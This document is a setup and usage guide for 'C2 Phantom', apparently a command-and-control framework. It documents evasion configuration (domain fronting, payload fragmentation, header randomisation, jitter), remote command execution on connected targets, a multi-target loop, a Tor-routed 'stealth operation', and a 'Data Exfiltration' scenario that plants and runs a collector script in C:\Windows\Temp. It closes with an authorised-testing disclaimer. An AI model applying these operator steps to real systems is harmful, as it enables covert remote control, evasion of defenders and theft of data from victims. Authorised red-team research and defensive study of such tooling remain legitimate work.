# 🎯 C2 Phantom - Complete Setup Guide

## Installation & First Run

### Step 1: Install C2 Phantom

Choose your preferred installation method:

#### Option A: Automated Installation (Recommended)
```powershell
# Windows PowerShell
.\run.ps1
```

```bash
# Linux/macOS
python install.py
```

#### Option B: Manual Installation
```powershell
# Install from source
pip install -e .

# Or install specific version
pip install -e ".[dev]"
```

#### Option C: Docker
```powershell
# Build and run
docker-compose up -d

# Access shell
docker exec -it c2-phantom bash
```

### Step 2: Initialize Configuration

```powershell
# Initialize with defaults
phantom init

# Initialize with custom config path
phantom init --config C:\custom\path\config.yaml

# Force reinitialize
phantom init --force
```

This creates:
- `~/.phantom/config.yaml` - Main configuration
- `~/.phantom/keys/` - Encryption keys
- `~/.phantom/logs/` - Log files
- `~/.phantom/sessions/` - Session data
- `~/.phantom/plugins/` - Custom plugins

### Step 3: Verify Installation

```powershell
# Check version
phantom --version

# View help
phantom --help

# Test CLI
phantom list
```

## Configuration

### Basic Configuration

Edit `~/.phantom/config.yaml`:

```yaml
# Server Configuration
server:
  host: 0.0.0.0
  port: 443
  tls_enabled: true
  certificate: null
  key: null

# Encryption Settings
encryption:
  default_algorithm: aes256-gcm
  key_size: 256
  forward_secrecy: true

# Network Configuration
network:
  protocols:
    - https
    - dns
    - websocket
  user_agents:
    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64)..."
  randomize_headers: true
  jitter_min: 500
  jitter_max: 2000

# Evasion Techniques
evasion:
  domain_fronting: true
  payload_fragmentation: true
  protocol_fingerprinting_evasion: true

# Logging
logging:
  level: INFO
  file: ~/.phantom/logs/phantom.log
  max_size: 10MB
  backup_count: 5

# Plugins
plugins:
  directory: ~/.phantom/plugins
  auto_load: true
```

### Advanced Configuration

```yaml
# Custom TLS certificates
server:
  tls_enabled: true
  certificate: C:\certs\phantom.crt
  key: C:\certs\phantom.key

# Multiple protocols
network:
  protocols:
    - https
    - dns
    - websocket
  
  # Custom user agents
  user_agents:
    - "Custom Agent 1.0"
    - "Another Agent 2.0"

# Fine-tuned evasion
evasion:
  domain_fronting: true
  payload_fragmentation: true
  protocol_fingerprinting_evasion: true
  timing:
    jitter_enabled: true
    jitter_min_ms: 100
    jitter_max_ms: 5000
```

## Usage Examples

### Example 1: Simple Connection

```powershell
# Connect to target
phantom connect https://192.168.1.100

# Check sessions
phantom list

# Execute command
phantom execute "whoami" --session <SESSION_ID> --output
```

### Example 2: Secure Connection with Encryption

```powershell
# Connect with AES-256
phantom connect https://target.com `
  --protocol https `
  --encrypt aes256 `
  --jitter 2000

# Upload encrypted file
phantom upload secret.txt /tmp/secret.txt `
  --session <SESSION_ID> `
  --encrypt `
  --progress
```

### Example 3: Using Proxy Chain

```powershell
# Connect through proxies
phantom connect https://target.com `
  --proxy "http://proxy1:8080" `
  --domain-front "cdn.example.com"
```

### Example 4: DNS Tunneling

```powershell
# Use DNS for covert channel
phantom connect target.com `
  --protocol dns `
  --encrypt aes256
```

### Example 5: WebSocket Persistent Connection

```powershell
# Establish WebSocket connection
phantom connect wss://target.com:443 `
  --protocol websocket `
  --timeout 60
```

### Example 6: Session Management

```powershell
# List all sessions
phantom list --format table

# List active sessions only
phantom list --status active --verbose

# Export session data
phantom list --format json > sessions.json

# List in YAML format
phantom list --format yaml
```

### Example 7: File Operations

```powershell
# Upload single file
phantom upload local.txt /remote/path/file.txt `
  --session <ID> `
  --progress

# Upload with custom chunk size
phantom upload large.bin /remote/large.bin `
  --session <ID> `
  --chunk-size 4096 `
  --encrypt
```

### Example 8: Command Execution

```powershell
# Execute command synchronously
phantom execute "dir C:\" `
  --session <ID> `
  --output `
  --timeout 30

# Execute command asynchronously
phantom execute "long-running-task" `
  --session <ID> `
  --async
```

### Example 9: Plugin Management

```powershell
# List plugins
phantom plugin list

# Load plugin
phantom plugin install my_plugin

# Get plugin info
phantom plugin info example

# Remove plugin
phantom plugin remove old_plugin
```

## Plugin Development

### Creating a Custom Plugin

Create `~/.phantom/plugins/my_plugin.py`:

```python
from c2_phantom.plugins.base import CommandPlugin

class MyCustomPlugin(CommandPlugin):
    name = "my_plugin"
    version = "1.0.0"
    description = "My custom C2 functionality"
    author = "Your Name"
    
    def initialize(self) -> None:
        self.logger.info("Initializing my plugin")
        
        # Register commands
        self.register_command(
            "greet",
            self.greet_command,
            "Greet the user"
        )
    
    def cleanup(self) -> None:
        self.logger.info("Cleaning up my plugin")
    
    def greet_command(self, name: str = "User") -> str:
        return f"Hello, {name}! Plugin is working!"

plugin_class = MyCustomPlugin
```

### Using Your Plugin

```powershell
# List available plugins
phantom plugin list

# The plugin will auto-load on startup
# Or manually load it
phantom plugin install my_plugin
```

## Advanced Scenarios

### Scenario 1: Multi-Target Campaign

```powershell
# Connect to multiple targets
phantom connect https://target1.com --session-name "Target1"
phantom connect https://target2.com --session-name "Target2"
phantom connect https://target3.com --session-name "Target3"

# List all active connections
phantom list --status active

# Execute on all targets
foreach ($session in (phantom list --format json | ConvertFrom-Json)) {
    phantom execute "whoami" --session $session.id --output
}
```

### Scenario 2: Stealth Operation

```powershell
# Maximum stealth configuration
phantom connect https://target.com `
  --protocol https `
  --encrypt aes256 `
  --proxy "socks5://127.0.0.1:9050" `
  --domain-front "cdn.cloudflare.com" `
  --jitter 3000
```

### Scenario 3: Data Exfiltration

```powershell
# Upload data collection script
phantom upload collector.ps1 C:\Windows\Temp\collector.ps1 `
  --session <ID> `
  --encrypt

# Execute collection
phantom execute "powershell C:\Windows\Temp\collector.ps1" `
  --session <ID> `
  --async

# Download results (after collection completes)
# (Download command would be added in full implementation)
```

## Troubleshooting

### Issue: Import Errors

```powershell
# Solution: Reinstall dependencies
pip install -r requirements.txt --force-reinstall
```

### Issue: Configuration Not Found

```powershell
# Solution: Reinitialize
phantom init --force
```

### Issue: Key Storage Errors

```powershell
# Solution: Check keyring service
# Windows: Ensure Windows Credential Manager is accessible
# Linux: Ensure gnome-keyring or kwallet is running
# macOS: Uses Keychain (should work by default)
```

### Issue: Connection Failures

```powershell
# Solution 1: Check network connectivity
Test-NetConnection target.com -Port 443

# Solution 2: Verify firewall rules
# Solution 3: Try different protocol
phantom connect target.com --protocol websocket
```

### Issue: Permission Denied

```powershell
# Solution: Run with elevated privileges
# Windows: Run PowerShell as Administrator
# Linux/macOS: Use sudo
sudo phantom init
```

## Best Practices

### Security
1. ✅ Always use encrypted connections
2. ✅ Enable Perfect Forward Secrecy
3. ✅ Use strong passwords for key storage
4. ✅ Regularly rotate encryption keys
5. ✅ Keep detailed logs of all operations

### Operational Security
1. ✅ Use domain fronting when possible
2. ✅ Enable timing jitter
3. ✅ Randomize user agents and headers
4. ✅ Use proxy chains for anonymity
5. ✅ Fragment large payloads

### Session Management
1. ✅ Name sessions descriptively
2. ✅ Regularly check session status
3. ✅ Clean up terminated sessions
4. ✅ Back up session data
5. ✅ Monitor session health

## Testing Your Setup

### Run Example Script

```powershell
# Navigate to examples directory
cd examples

# Run usage example
python usage_example.py
```

### Run Tests

```powershell
# Run all tests
pytest

# Run with coverage
pytest --cov=c2_phantom

# Run specific test
pytest tests/test_encryption.py -v
```

## Next Steps

1. 📖 Read the full [README.md](README.md)
2. 🎯 Try the [QUICKSTART.md](QUICKSTART.md) guide
3. 🔌 Develop custom plugins
4. 🧪 Experiment with different protocols
5. 📊 Review session logs and metrics

## Support & Resources

- **Documentation**: README.md, QUICKSTART.md, PROJECT_SUMMARY.md
- **Examples**: examples/ directory
- **Issues**: GitHub Issues tracker
- **Email**: phantom@redteam.local

## Legal Reminder

⚠️ **C2 Phantom is for AUTHORIZED security testing ONLY!**

Always:
- ✅ Get written permission
- ✅ Work in controlled environments
- ✅ Document all activities
- ✅ Follow responsible disclosure
- ❌ Never use maliciously

---

**Happy (ethical) hacking! 🔮**
